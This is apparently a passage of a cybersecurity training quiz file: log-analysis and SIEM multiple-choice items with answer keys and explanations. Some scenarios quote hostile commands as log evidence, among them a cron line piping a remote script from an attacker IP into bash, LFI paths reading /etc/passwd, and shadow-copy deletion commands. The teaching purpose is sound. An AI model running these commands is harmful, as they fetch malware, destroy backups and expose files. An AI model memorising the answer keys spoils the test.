          explanation: "URL-decoded payloads (' OR '1'='1, UNION SELECT, ;SELECT * FROM users) = classic SQLi. 200 + growing body size is a strong indicator the queries are succeeding and exfiltrating rows. Action: block IP, enable WAF rule, code review of /products."
        },
        {
          id: "la-q3-4",
          difficulty: "medium",
          tags: ["Firewall", "Port Scan"],
          scenario: "Firewall syslog:\n  10.6.1.77 → 10.6.1.10:22 SYN  denied\n  10.6.1.77 → 10.6.1.10:23 SYN  denied\n  10.6.1.77 → 10.6.1.10:80 SYN  denied\n  10.6.1.77 → 10.6.1.10:443 SYN  denied\n  10.6.1.77 → 10.6.1.10:445 SYN  denied\n  ... (sequential ports 1-65535 in 12s) ...",
          question: "What is this and what makes the source notable?",
          options: [
            "An external network port scan originating from the public internet, which can be safely ignored as it is blocked by default.",
            "A routine asset management discovery scan executed by the IT department to catalog active system services across subnets.",
            "An internal port scan (T1046) from a workstation; investigate the host immediately as it indicates potential post-compromise discovery.",
            "A high-volume automated backup operation transferring large database files between administrative servers on active ports."
          ],
          correctAnswer: 2,
          explanation: "Internal-to-internal scans are far more concerning than internet noise — they almost always mean a host is already compromised and the attacker is enumerating the segment. Confirm with asset-mgmt records before assuming malice, then isolate."
        },
        {
          id: "la-q3-5",
          difficulty: "medium",
          tags: ["DNS", "DNS Tunneling"],
          scenario: "DNS server query log for one client (5 min):\n  a1b2c3d4e5.exfil.attacker.tld TXT\n  f6g7h8i9j0.exfil.attacker.tld TXT\n  k1l2m3n4o5.exfil.attacker.tld TXT\n  ... 1,200 unique subdomains, all TXT, all to *.exfil.attacker.tld ...",
          question: "What is this pattern?",
          options: [
            "Normal Content Delivery Network (CDN) load-balancing traffic, which routinely queries dynamic domain records for routing.",
            "Standard DNSSEC cryptographic key validation and query patterns, where local recursive resolvers refresh zone signatures.",
            "A DNS amplification denial-of-service attack, where the attacker uses open resolvers to flood the target network with packets.",
            "DNS tunneling or data exfiltration (T1071.004/T1048.003); sinkhole the destination domain, and network-isolate the client immediately."
          ],
          correctAnswer: 3,
          explanation: "High entropy in subdomain labels + a single parent + TXT (large response capacity) is the canonical DNS-tunnel signature. Tools: dnscat2, iodine. Sinkhole the parent at the resolver; pivot to EDR for the process."
        },
        {
          id: "la-q3-6",
          difficulty: "medium",
          tags: ["Proxy", "C2 / Beaconing"],
          scenario: "Squid proxy log filtered for one client over 6 hours:\n  Every 60 ±3 seconds: GET http://185.234.x.x/api/poll  302  227 bytes  user-agent=curl/7.85.0",
          question: "Interpretation?",
          options: [
            "Active C2 beaconing indicated by periodic requests, raw destination IP, and atypical user-agent; isolate the client and block the IP.",
            "Normal web browser background polling, which queries administrative webmail servers at regular intervals to refresh user inbox states.",
            "An automated software updater client query, which contacts vendor endpoints to verify local system configuration package versions.",
            "A routine Network Time Protocol (NTP) sync request polling high-precision time servers to correct local workstation system clock drift."
          ],
          correctAnswer: 0,
          explanation: "Beacon traits present: regular interval with small jitter, suspicious destination (IP not domain), atypical UA (curl from a user host), tiny response body for control channel. Even on port 80/443 the timing exposes it."
        },
        {
          id: "la-q3-7",
          difficulty: "medium",
          tags: ["Web Logs", "LFI/RCE"],
          scenario: "Nginx access log:\n  GET /index.php?page=../../../../etc/passwd  200  3214\n  GET /index.php?page=php://filter/convert.base64-encode/resource=config  200  4011",
          question: "What two techniques are visible?",
          options: [
            "An attempt to perform directory listing on a restricted application directory, which returned a default server error response.",
            "Local File Inclusion (LFI) and PHP wrapper abuse (T1083/T1005) to read sensitive files and configurations; restrict open_basedir.",
            "A SQL injection (SQLi) attempt targeting database tables, which is handled and logged by database input validation libraries.",
            "A Server-Side Request Forgery (SSRF) attack attempting to force the backend web application to query internal server endpoints."
          ],
          correctAnswer: 1,
          explanation: "Classic LFI plus the php://filter wrapper to bypass PHP rendering and dump source/config. 200 on both = success. Any DB creds, API keys, or JWT secrets in the leaked config must be considered compromised."
        },
        {
          id: "la-q3-8",
          difficulty: "hard",
          tags: ["Linux", "Persistence"],
          scenario: "On a Linux web server, recent additions found by an audit:\n  /etc/cron.d/sysupd: */5 * * * * root curl -s http://185.234.x.x/s | bash\n  ~/.ssh/authorized_keys gained a new entry: ssh-rsa AAAA... attacker@op\n  /etc/systemd/system/upd.service runs /tmp/.x every boot",
          question: "Best summary?",
          options: [
            "A series of routine system updates deployed by the DevOps team to install standard utilities and update local user public keys.",
            "An automated backup script configuration that schedules administrative tasks and establishes system recovery processes for the host.",
            "Multiple persistence mechanisms (cron, SSH key, and service); assume full compromise, rebuild the host, and rotate all keys.",
            "A third-party systems monitoring agent installation that sets up background services to report hardware health details to the SOC."
          ],
          correctAnswer: 2,
          explanation: "Multiple independent persistence channels = the attacker assumed they'd be evicted and planted redundancy. Cleanup is not enough — rebuild. Don't forget any SSH keys this host trusted outbound, and any service tokens stored on it."
        },
        {
          id: "la-q3-9",
          difficulty: "hard",
          tags: ["Web Logs", "Recon"],
          scenario: "Web access log shows from a single IP:\n  GET /.git/config  404\n  GET /.env  200\n  GET /backup.zip  200\n  GET /admin/  401\n  GET /wp-login.php  404\n  GET /phpmyadmin/  404",
          question: "What is this and which response is the WORST news?",
          options: [
            "Harmless random scanner noise, as the majority of HTTP responses are non-200 errors and do not point to a successful compromise.",
            "An automated distributed denial-of-service (DDoS) attempt seeking to overwhelm the web application server with rapid requests.",
            "A search engine crawler checking for site search engine optimization rules and cataloging public links for index database updates.",
            "A content discovery scan where 200 codes confirm leak of sensitive files (/.env and /backup.zip); rotate all leaked credentials."
          ],
          correctAnswer: 3,
          explanation: ".env and backup archives in the web root are catastrophic exposures — they leak production secrets in plaintext. 200 means the attacker got them. Rotate every credential, key, and token in those files immediately and audit access logs for the same IP elsewhere."
        },
        {
          id: "la-q3-10",
          difficulty: "hard",
          tags: ["Correlation", "Multi-source"],
          scenario: "Same user, three logs, 30 seconds apart:\n  VPN: jdoe authenticated from 185.x.x.x (Country: RU)\n  Okta: jdoe MFA push approved (Country: RU)\n  Email: jdoe rule created — forward all mail to ext@attacker.tld + auto-delete",
          question: "Verdict and priority action?",
          options: [
            "Legitimate business travel by the employee, requiring you to mark the geographic logins as approved and close the alert ticket.",
            "Account takeover with mail forwarding (T1078/T1114.003); terminate all sessions, reset credentials/MFA, and delete the inbox rule.",
            "A simulated phishing test run by the internal security training team, which automatically flags rules and triggers alert testing.",
            "An instance of MFA fatigue where the user accidentally approved a prompt but did not suffer a successful compromise of their account."
          ],
          correctAnswer: 1,
          explanation: "Foreign auth followed within seconds by a hidden forwarding rule is the signature of business-email-compromise. Removing the rule is necessary but not sufficient — the attacker may have created OAuth app grants, inbox rules at the folder level, or alternate MFA devices."
        },
    ]
  },
  {
    quizId: "la-q4",
    courseId: "log-analysis",
    title: "Attack Pattern Recognition in Logs",
    description: "Identify multi-stage attack patterns — lateral movement, beaconing, exfiltration, ransomware staging — from log evidence.",
    passingScore: 80,
    timeLimit: 25,
    questions: [
        {
          id: "la-q4-1",
          difficulty: "medium",
          tags: ["Lateral Movement", "SMB"],
          scenario: "From host A (10.4.2.55) in 90 seconds:\n  10.4.2.55 → 10.4.2.10:445 SMB  Tree connect to ADMIN$\n  10.4.2.55 → 10.4.2.10:445 SMB  Write file: PSEXESVC.exe\n  10.4.2.10 EID 7045 ServiceName=PSEXESVC  ServiceFileName=%SystemRoot%\\PSEXESVC.exe\n  10.4.2.10 EID 4624 LogonType=3 Account=admin SourceNetworkAddress=10.4.2.55",
          question: "What technique is this and what is the right containment?",
          options: [
            "Routine fileshare connection where administrators execute standard system configurations or check directory properties.",
            "An automated system backup task configured to replicate server configurations and registry hives across administrative hosts.",
            "PsExec lateral movement (T1021.002/T1569.002); isolate hosts, stop the service, and hunt for credential compromise source.",
            "A normal Group Policy application pushing software packages and checking administrative privileges on remote endpoints."
          ],
          correctAnswer: 2,
          explanation: "ADMIN$ write of PSEXESVC + a matching 7045 + a 4624 Type 3 with admin creds = PsExec lateral movement. Critical question is HOW host A got admin creds (LSASS dump? Mimikatz? cached creds?) — that's the real start of the chain."
        },
        {
          id: "la-q4-2",
          difficulty: "medium",
          tags: ["Beaconing", "Timing Analysis"],
          scenario: "Proxy log for one workstation, plotted by minute:\n  Connections to a single external host arrive at 00, 60, 120, 180 ... seconds with ±3s jitter, 24h continuous, 24-byte payloads.",
          question: "Strongest single indicator that this is C2 beaconing rather than legitimate polling?",
          options: [
            "The connection utilizes HTTPS, which is atypical for standard corporate updates or developer API telemetry checks.",
            "The communication occurs over port 443, indicating that standard web traffic channels are being used to transport data.",
            "The source host is a macOS endpoint, which does not normally execute background system checks or diagnostic updates.",
            "Continuous 24h periodic connections with a fixed interval and tiny payloads, indicating lack of human-driven activity gaps."
          ],
          correctAnswer: 3,
          explanation: "Humans create natural gaps; software beacons don't. Continuous 24h periodicity with tiny payloads is the timing fingerprint of C2 (Cobalt Strike, Sliver, Empire). Pair with destination-reputation and JA3 for high confidence."
        },
        {
          id: "la-q4-3",
          difficulty: "medium",
          tags: ["Exfiltration", "DLP"],
          scenario: "Egress sensor:\n  Host 10.5.6.7 → drive.attacker.tld over 4h transferred 14 GB outbound\n  Same host shows 100MB/day average for the previous 30 days",
          question: "Best characterization?",
          options: [
            "Data exfiltration (T1048/T1567) to a new destination exceeding the baseline; isolate the host and evaluate data access scope.",
            "A legacy server backup task misconfiguration causing duplicate incremental database dumps to be pushed to an external server.",
            "A background operating system software update check transferring diagnostic logs and package files to vendor update endpoints.",
            "A normal cloud synchronization process triggered when a user uploads raw data archives to approved corporate storage bins."
          ],
          correctAnswer: 0,
          explanation: "Baselines are king. 140× normal egress + new external destination is a near-certain exfil. The follow-up question — 'what could that host reach?' — drives the breach scope and any required disclosures."
        },
        {
          id: "la-q4-4",
          difficulty: "medium",
          tags: ["Ransomware", "Staging"],
          scenario: "EDR + file telemetry on a file server in 6 minutes:\n  vssadmin delete shadows /all /quiet\n  wbadmin delete catalog -quiet\n  bcdedit /set {default} recoveryenabled No\n  Followed by mass file renames: *.docx → *.docx.<random>",
          question: "What stage of what attack is this?",
          options: [
            "A routine administrative backup cleanup task deleting old shadow copies to free up local disk space during low-usage hours.",
            "A standard disk defragmentation run which reorganizes storage sectors and updates boot configuration settings for efficiency.",
            "Ransomware staging and encryption (T1490/T1486); isolate the file server immediately and prepare to restore from backups.",
            "A routine operating system upgrade task that modifies boot loaders, adjusts recovery configurations, and resets volume settings."
          ],
          correctAnswer: 2,
          explanation: "Shadow-copy deletion + boot-config tamper + mass rename to random extensions is the canonical pre-encryption + encryption sequence. Speed matters — every minute is more files lost. The encryptor is usually still resident; capture it before reboot."
        },
        {
          id: "la-q4-5",
          difficulty: "medium",
          tags: ["Credential Theft", "LSASS"],
          scenario: "Sysmon Event ID 10 (process access):\n  SourceImage=C:\\Users\\jdoe\\AppData\\Local\\Temp\\proc.exe\n  TargetImage=C:\\Windows\\System32\\lsass.exe\n  GrantedAccess=0x1410",
          question: "Interpretation?",
          options: [
            "A routine security agent or antivirus scan accessing system files to check for malware signatures and malicious process hooks.",
            "A standard Windows Update process checking the status of running system processes to ensure compatibility before applying updates.",
            "Normal EDR agent self-protection behavior, which queries system processes to prevent tampered processes from disabling the agent.",
            "Credential dumping against LSASS (T1003.001) as shown by PROCESS_VM_READ access; isolate the host and rotate compromised creds."
          ],
          correctAnswer: 3,
          explanation: "Non-EDR process touching LSASS with VM_READ is one of the highest-confidence credential-theft signals. Anyone whose session was active on that host must rotate creds, and any service tickets the host held are suspect."
        },
        {
          id: "la-q4-6",
          difficulty: "hard",
          tags: ["Living Off the Land", "Discovery"],
          scenario: "On a freshly compromised workstation, in the first 8 minutes:\n  whoami /all\n  net user /domain\n  net group \"Domain Admins\" /domain\n  nltest /dclist:corp.local\n  ipconfig /all\n  arp -a\n  tasklist /svc\n  systeminfo",
          question: "What stage and what tools?",
          options: [
            "Post-exploitation discovery (T1087/T1018/T1082) using native binaries; detect by execution burst sequence rather than reputation.",
            "Routine helpdesk diagnostics executed manually by a remote administrator troubleshooting connection and configuration issues.",
            "The initial execution phase of a phishing payload, which uses malicious custom macros to connect to command-and-control servers.",
            "A standard system backup script checking configuration details and active network endpoints before starting database replication."
          ],
          correctAnswer: 0,
          explanation: "Each command alone is benign — admins run them. The TELL is that they're all run in seconds, by the same user, on a workstation that never normally does this. Detection rule: 5+ discovery commands within 2 minutes by a non-admin → alert."
        },
        {
          id: "la-q4-7",
          difficulty: "hard",
          tags: ["Persistence", "Scheduled Task"],
          scenario: "EID 4698 (scheduled task created):\n  TaskName=\\Microsoft\\Windows\\AppCompat\\PolicyConverter\n  TaskContent=...<Exec><Command>powershell.exe</Command><Arguments>-w hidden -enc JABzAD0A...</Arguments></Exec>...\n  Trigger: <LogonTrigger>",
          question: "Why is the task name notable, and what is this?",
          options: [
            "A legitimate Microsoft task installed automatically during operating system setup to monitor application compatibility policies.",
            "A routine graphic driver update checking for hardware configurations and updating administrative software packages at user logon.",
            "Scheduled task persistence (T1053.005) masquerading as a system task (T1036.005); disable task and decode encoded PowerShell.",
            "A standard Group Policy preference task configured by system administrators to push software and update configurations at logon."
          ],
          correctAnswer: 2,
          explanation: "Attackers love task names under \\Microsoft\\Windows\\... because hurried analysts assume they're legit. Always validate against a clean baseline of Microsoft-shipped tasks and decode any encoded PowerShell payload."
        },
        {
          id: "la-q4-8",
          difficulty: "hard",
          tags: ["Cloud", "IAM Abuse"],
          scenario: "AWS CloudTrail in 4 minutes:\n  CreateAccessKey  user=Alice  by=Alice\n  PutUserPolicy  user=Alice  policy={\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}\n  AssumeRole  role=OrgAdmin  source=185.x.x.x (new IP, new region)",
          question: "What happened?",
          options: [
            "Standard administrative work, where a user legitimately creates API keys and updates permissions to configure new cloud resources.",
            "AWS internal cloud maintenance, where security policies are automatically adjusted to support new virtualization node features.",
            "A routine multi-factor authentication enrollment process, where user authentication keys are updated for secure console access.",
            "Cloud account takeover and privilege escalation (T1078.004/T1098.001); disable the keys, audit logs, and rotate compromised secrets."
          ],
          correctAnswer: 3,
          explanation: "Key creation + self-applied admin-equivalent policy + new-geo AssumeRole is a classic cloud-compromise chain. The blast radius is whatever * allowed — assume worst case until proven otherwise. CloudTrail + S3 data events + GuardDuty are the pivot points."
        },
        {
          id: "la-q4-9",
          difficulty: "hard",
          tags: ["Phishing", "Initial Access"],
          scenario: "Mail gateway → EDR chain in 90 seconds:\n  Mail: from=hr@partner-co.tld  subject='Updated invoice'  attachment=invoice.html (HTML smuggling)\n  Browser: user opens invoice.html which writes setup.iso to Downloads\n  Mount: setup.iso mounted as E:\\ — contains shortcut.lnk + hidden script.bat\n  Process: explorer.exe → wscript.exe E:\\script.bat → powershell -enc ...",
          question: "Best classification of the initial access technique?",
          options: [
            "A drive-by download attack, where a compromised website automatically downloads malware to the user's endpoint without interaction.",
            "Phishing via HTML smuggling and ISO container (T1566.001/T1027.006) to bypass Mark-of-the-Web; block sender and block ISO mounts.",
            "A watering hole attack, where the attacker compromises a third-party resources site regularly visited by company employees.",
            "A supply chain compromise, where a trusted software updates package is modified by the vendor to include hidden malicious code."
          ],
          correctAnswer: 1,
          explanation: "HTML-smuggling delivery + ISO/IMG container is the dominant 2023-2025 initial-access pattern (Qakbot, BumbleBee, IcedID). Detection requires correlating mail → browser write → mount → script execution, which is why mail-only or EDR-only views miss it."
        },
        {
          id: "la-q4-10",
          difficulty: "hard",
          tags: ["Kill Chain", "Storytelling"],
          scenario: "Reviewing 14 days of logs after detection, you assemble:\n  Day 1: phishing email with macro (T1566.001)\n  Day 1: macro runs PowerShell, beacons to 185.x.x.x (T1059.001 + T1071)\n  Day 3: Mimikatz on workstation (T1003.001)\n  Day 5: PsExec to fileserver (T1021.002)\n  Day 7: scheduled task persistence on 4 hosts (T1053.005)\n  Day 12: vssadmin delete + mass file encryption (T1490 + T1486)",
          question: "Which artifact is the highest-priority root-cause finding for the post-incident report?",
          options: [
            "The file encryption event on Day 12, since that is the phase where the business suffered actual data loss and financial impact.",
            "The Day 1 phishing email (initial access vector), as addressing the start of the kill chain blocks all downstream attack phases.",
            "The PsExec lateral movement on Day 5, since stopping administrative service creation prevents propagation to secondary hosts.",
            "The scheduled task creation on Day 7, since cleaning up persistence keys prevents the adversary from maintaining access."
          ],
          correctAnswer: 1,
          explanation: "Post-incident reports drive prevention investment. The initial access vector (Day 1 phishing macro) is the single highest-leverage control point — block it and the rest of the chain never starts. The other events inform detection improvements, not prevention."
        },
    ]
  },
  {
    quizId: "la-q5",
    courseId: "log-analysis",
    title: "Log Analysis Tools, Queries & Best Practices",
    description: "CLI triage (grep/awk/jq), Splunk SPL, ELK KQL, and operational best practices for production log analysis.",
    passingScore: 80,
    timeLimit: 25,
    questions: [
        {
          id: "la-q5-1",
          difficulty: "easy",
          tags: ["CLI", "grep/awk"],
          scenario: "On a Linux box (no SIEM access), you need the top 10 source IPs by failed-SSH count from /var/log/auth.log over 1M lines.",
          question: "Which pipeline is correct and idiomatic?",
          options: [
            "cat /var/log/auth.log | wc -l — using word count utility to count total lines in the file to estimate traffic volume.",
            "tail -f /var/log/auth.log — monitoring authentication logs in real-time to manually spot connection failures as they occur.",
            "grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10",
            "cp /var/log/auth.log /tmp/ — copying the log file to a temporary directory to open it in a text editor for manual searching."
          ],
          correctAnswer: 2,
          explanation: "Standard CLI triage: filter (grep) → extract field (awk; $(NF-3) is the source IP in the default sshd Failed-password format) → count (sort | uniq -c) → rank (sort -rn) → top N (head). Works on any UNIX without extra tooling."
        },
        {
          id: "la-q5-2",
          difficulty: "easy",
          tags: ["jq", "JSON"],
          scenario: "An EDR streams JSON one-per-line. You want the count of unique processes (process.name) where event.action='process_create' in the last 100k lines of /var/log/edr.json.",
          question: "Best jq pipeline?",
          options: [
            "jq '.process' /var/log/edr.json — executing a simple jq query to extract the process sub-object from every line in the log.",
            "cat /var/log/edr.json | grep process — using grep to search for occurrences of the word process and outputting raw match lines.",
            "awk '{print $1}' /var/log/edr.json — running awk to print the first space-separated token of each JSON log entry in the file.",
            "tail -n 100000 /var/log/edr.json | jq -r 'select(.event.action==\"process_create\") | .process.name' | sort -u | wc -l"
          ],
          correctAnswer: 3,
          explanation: "jq -r 'select(...) | .field' is the canonical way to filter + project structured JSON. Always tail-bound to keep one-shot triage fast on multi-GB files."
        },
        {
          id: "la-q5-3",
          difficulty: "medium",
          tags: ["Splunk SPL", "Detection"],
          scenario: "You need a Splunk search that returns users with ≥5 failed logins followed by 1+ success within 10 minutes from the same source IP.",
          question: "Which structure is correct?",
          options: [
            "index=auth EventCode IN (4624,4625) | stats count(eval(EventCode=4625)) AS fails count(eval(EventCode=4624)) AS success by user, src_ip | where fails>=5 AND success>=1",
            "index=auth | stats count — running a generic aggregation query that returns the total count of all events currently in the auth index.",
            "index=auth | sort _time — sorting all authentication events in chronological order to manually scan for failure-success transitions.",
            "index=auth | dedup user — removing duplicate user field entries from the results to get a flat list of users who have authenticated."
          ],
          correctAnswer: 0,
          explanation: "The eval-inside-stats pattern is the standard SPL way to count conditionally across event types. span=10m bins time; by user+src_ip groups the triage unit. The where clause is the alert condition. The other answers don't express the multi-condition correlation."
        },
        {
          id: "la-q5-4",
          difficulty: "medium",
          tags: ["KQL", "Detection"],
          scenario: "Microsoft Sentinel / Defender KQL: 'lsass.exe accessed by a non-Microsoft-signed process in the last 24h'.",
          question: "Which query best matches?",
          options: [
            "SecurityEvent | take 10 — pulling 10 random security events from the workspace to inspect common columns and event structure.",
            "SigninLogs | summarize count() — summarizing the total number of user sign-in events recorded during the default search window.",
            "DeviceProcessEvents | where Timestamp > ago(24h) | where FileName == \"lsass.exe\" and InitiatingProcessSignatureStatus != \"Signed\"",
            "Heartbeat | where TimeGenerated > ago(24h) | summarize count() by Computer — counting the heartbeat checks sent by agent endpoints."
          ],
          correctAnswer: 2,
          explanation: "Approximate, but it shows the correct pattern: time bound + signature filter on the initiator + join on device + the lsass target. Real prod rules add allowlists for EDR/AV agents. The other answers don't touch process telemetry."
        },
        {
          id: "la-q5-5",
          difficulty: "medium",
          tags: ["Best Practice", "Parsing"],
          scenario: "A vendor pushes a major log-format change in the next maintenance window. Your detections rely on extracted fields.",
          question: "Lowest-risk way to handle this?",
          options: [
            "Deploy the new parser configuration directly in production during weekend off-hours and monitor the alert queue manually for errors.",
            "Pause log ingestion on all forwarders entirely during the software maintenance window to prevent unparsed logs from being indexed.",
            "Delete all existing detections and recreate them from scratch using the new vendor log documentation once updates are completed.",
            "Ingest new logs to a test tier, validate affected parsers and detections, then promote while maintaining the old parser as a fallback."
          ],
          correctAnswer: 3,
          explanation: "Treat parsers like code: dev → test → prod with a rollback. Vendor format changes are the single most common cause of silent detection failures (rules look healthy but match nothing)."
        },
        {
          id: "la-q5-6",
          difficulty: "medium",
          tags: ["Detection Hygiene", "False Positives"],
          scenario: "A 'mass file access' detection fires 200×/day, 95% from one backup agent (svc_backup) on backup hosts during 22:00–02:00.",
          question: "Best response?",
          options: [
            "Add a scoped exclusion for svc_backup on known backup hosts during the backup window, while leaving the rule active for all other hosts.",
            "Disable the alert rule completely, since backup agents regularly trigger false positives and the noise level is too high for analysts.",
            "Lower the detection threshold to reduce the sensitivity of the rule, ensuring it only triggers on much larger volume access anomalies.",
            "Instruct analysts to manually close all alerts associated with the backup service account as false positives without auditing them."
          ],
          correctAnswer: 0,
          explanation: "Disabling (A) loses real detection. The correct discipline is scoped allowlisting (user + host + window) with a comment trail so the exclusion can be audited and revisited. Lowering thresholds (C) makes noise worse."
        },
        {
          id: "la-q5-7",
          difficulty: "medium",
          tags: ["Retention", "Cost"],
          scenario: "Your SIEM hot tier is at 95% capacity. CFO wants spend cut 30%. Logs include 60% verbose application DEBUG that no detection uses.",
          question: "Best architectural fix?",
          options: [
            "Purchase additional high-performance hot storage arrays to scale database capacity, accommodating all verbose application logs.",
            "Stop logging application activity entirely, keeping only operating system auditing active to reduce resource usage on the SIEM.",
            "Implement tiered storage: route verbose debug logs to cheap cold storage, and keep high-fidelity security logs on the hot search tier.",
            "Configure the SIEM database to automatically purge all logs older than 24 hours to enforce strict space controls and limit costs."
          ],
          correctAnswer: 2,
          explanation: "Tiered architecture (hot SIEM + cold data lake) is the standard cost-control answer. Security-relevant data stays fast; verbose dev data is preserved cheaply and searchable on-demand for incident timelines."
        },
        {
          id: "la-q5-8",
          difficulty: "hard",
          tags: ["Detection Engineering", "Sigma"],
          question: "Why is writing a detection in Sigma (vendor-neutral YAML) preferred over writing it natively in one SIEM's query language for a security team that runs Splunk today but is piloting Sentinel?",
          options: [
            "Sigma rules run significantly faster in the SIEM database because they compile directly to native machine code during execution.",
            "Sigma has lower false-positive rates because the framework includes built-in machine learning models to filter out benign noise.",
            "Sigma format is mandatory for organizations aiming to satisfy PCI-DSS and SOC 2 compliance log validation audits and reviews.",
            "Sigma provides a portable, vendor-neutral YAML schema that compiles (via pySigma) into native queries for Splunk, Sentinel, and Elastic."
          ],
          correctAnswer: 3,
          explanation: "Vendor lock-in is the silent killer of detection libraries. Sigma captures the logic once; converters emit per-vendor syntax. The team can run dual-SIEM during migration without doubling engineering work."
        },
        {
          id: "la-q5-9",
          difficulty: "hard",
          tags: ["Operational", "Alert Triage"],
          scenario: "Your queue holds 480 alerts across 4 analysts on shift. Many are repeats of the same underlying event.",
          question: "Most impactful operational fix?",
          options: [
            "Hire four additional Tier 1 security analysts immediately to distribute the workload and prevent queue bottlenecks during shifts.",
            "Group related alerts into unified incidents by entity and time window, tune noisy rules, and suppress known benign automation patterns.",
            "Disable all detections that trigger frequently, allowing the team to focus entirely on low-volume, high-fidelity security alerts.",
            "Stop ingesting noisy log sources like endpoint firewall or verbose web proxy traffic, resolving queue bottlenecks at the source."
          ],
          correctAnswer: 1,
          explanation: "Alert-to-incident aggregation + targeted tuning is the proven analyst-capacity multiplier. Hiring (A) treats symptoms; disabling sources/detections (C,D) loses coverage. Track 'time to triage' and 'alerts per incident' as the operational KPIs."
        },
        {
          id: "la-q5-10",
          difficulty: "hard",
          tags: ["Best Practice", "Time Sync"],
          scenario: "Post-incident review: your timeline is 11 minutes off between firewall and EDR, making causality ambiguous in the report.",
          question: "Root cause and durable fix?",
          options: [
            "Manually reformat the timestamp columns in the post-incident report to align event times and make the correlation appear consistent.",
            "Clock drift; enforce a single authoritative NTP source across the fleet, standardize on UTC, and monitor skew via SIEM ingest alerts.",
            "Deploy a high-performance next-generation firewall to minimize network processing delay and reduce packet transmission latencies.",
            "Omit all timestamp details and chronological timeline figures from the final reports, relying instead on high-level logical order."
          ],
          correctAnswer: 1,
          explanation: "Drift is silent and lethal to investigations. Single NTP source + drift monitoring + UTC everywhere is the fix. Add a regular detection on 'ingest_time - event_time' to catch sources whose clocks slip."
        },
    ]
  },

  // ==========================================
  // SIEM FUNDAMENTALS QUIZZES
  // ==========================================
  {
    quizId: "siem-q1",
    courseId: "siem-fundamentals",
    title: "SIEM Architecture & Data Flow",
    description: "Scenario-based quiz on how a SIEM ingests, parses, and stores telemetry end-to-end.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "siem-q1-1",
        difficulty: "easy",
        tags: ["Architecture", "Splunk"],
        scenario: "You are drawing the data path for a new Splunk deployment:\n  Endpoints (UF) → ?  → ?  → Analyst's browser\nYour senior asks you to label each tier.",
        question: "Which ordering of Splunk components correctly represents the path from a forwarded event to an analyst's search result?",
        options: [
          "Universal Forwarder → Search Head (parse + store) → Indexer (query + render) → Browser",
          "Universal Forwarder → Deployment Server (parse + store) → Browser (query + render) → Indexer",
          "Universal Forwarder → Heavy Forwarder/Indexer (parse + store) → Search Head (query + render) → Browser",
          "Universal Forwarder → Browser (parse + store) → Indexer (query + render) → Search Head"
        ],
        correctAnswer: 2,
        explanation: "UFs ship raw data to indexers (or a heavy forwarder first), which parse and write tsidx + raw buckets. The search head dispatches SPL to indexers, merges results, and renders them in the browser. (A) inverts indexer/search head. (B) confuses the deployment server (config management) with the data path."
      },
      {
        id: "siem-q1-2",
        difficulty: "medium",
        tags: ["Ingestion", "Sizing", "EPS"],
        scenario: "Procurement asks you to size a SIEM license. You measure baseline EPS over a week:\n  Avg EPS: 4,200\n  Peak EPS (business hours): 11,500\n  P95 EPS: 8,800\nVendor licenses are sold in steady-state EPS bands (5k, 10k, 15k).",
        question: "Which tier should you recommend and why?",
        options: [
          "10k — size to the P95 volume to provide headroom; indexer queues will smooth the remaining peak bursts.",
          "5k — size to the average daily volume to minimize baseline cost; indexer queues will absorb all peak bursts.",
          "15k — size to the peak business hours volume to ensure zero queuing; accept the significantly higher licensing costs.",
          "5k — size to average daily volume and enforce strict rate-limiting at forwarders to drop all excess event bursts."
        ],
        correctAnswer: 0,
        explanation: "Sizing to the average under-licenses; sizing to peak over-pays. P95 (10k tier here) is the standard SOC compromise — short bursts above P95 are absorbed by indexer ingestion queues. (D) drops security-relevant data — never acceptable for detection."
      },
      {
        id: "siem-q1-3",
        difficulty: "medium",
        tags: ["Normalization", "CIM"],
        scenario: "Two sources log a failed login differently:\n  Windows 4625:  TargetUserName=jdoe  IpAddress=10.4.2.9  Status=0xC000006A\n  Okta:         {\"actor\":{\"alternateId\":\"[email protected]\"},\"client\":{\"ipAddress\":\"10.4.2.9\"},\"outcome\":{\"result\":\"FAILURE\"}}\nYou want a single correlation rule that fires on N failed logins per user across BOTH sources.",
        question: "Which approach is correct?",
        options: [
          "Write two separate correlation rules, maintaining individual filters for Okta and Windows log structures.",
          "Strip both log types down to raw unparsed text and use wildcard regex filters to search for the string 'fail'.",
          "Ingest all Okta telemetry directly into the Windows security index to force the logs to share parsing configs.",
          "Normalize both sources into a common schema (CIM/ECS) and write a single rule referencing those normalized fields."
        ],
        correctAnswer: 3,
        explanation: "Common Information Model (Splunk CIM) / Elastic Common Schema (ECS) exist precisely for this — map disparate vendor fields to canonical names (user, src, action) at parse time so detections are written once. (A) doubles maintenance. (C) corrupts source typing and breaks parsing."
      },
      {
        id: "siem-q1-4",
        difficulty: "medium",
        tags: ["Storage Tiering"],
        scenario: "Your SIEM has 30 days hot, 90 days warm, 365 days cold. An IR team needs to investigate an incident from 6 months ago.",
        question: "What is the realistic expectation when querying that data?",
        options: [
          "The query executes at standard speed because cold storage remains fully indexed and optimized for search heads.",
          "The query runs successfully but much slower, often requiring manual rehydration or admin intervention to thaw data.",
          "The query fails completely because cold storage data is compressed, encrypted, and permanently deleted after 90 days.",
          "The query executes normally while the SIEM background process automatically promotes the cold data back to the hot tier."
        ],
        correctAnswer: 1,
        explanation: "Cold storage trades retrieval latency for cost. Some platforms (e.g. Splunk frozen/S3, Sentinel basic logs) require an explicit restore/search-job before the data is queryable. Plan retention tiers around realistic IR needs."
      },
      {
        id: "siem-q1-5",
        difficulty: "hard",
        tags: ["Search Performance", "tstats"],
        scenario: "A nightly Splunk search:\n  index=* sourcetype=* fail* | stats count by user\ntakes 45 minutes and times out. Daily volume is ~2 TB.",
        question: "Which rewrite gives the biggest, correct performance win?",
        options: [
          "Append the '| head 1000' command at the end of the query to limit search head processing to the first 1,000 matches.",
          "Filter on specific indexes/sourcetypes and use the tstats command against accelerated data models to query metadata.",
          "Remove the time picker boundaries to scan all historic indices concurrently, ensuring no relevant events are missed.",
          "Schedule the exact same query to run automatically at 3 a.m. when server CPU usage and disk I/O are at their lowest."
        ],
        correctAnswer: 1,
        explanation: "index=* sourcetype=* is the worst possible filter — it forces every bucket to be opened. tstats reads tsidx (indexed metadata) instead of raw events and is often 10–100x faster, especially against an accelerated data model. (A) limits output AFTER the expensive work."
      },
      {
        id: "siem-q1-6",
        difficulty: "medium",
        tags: ["Correlation", "Detection"],
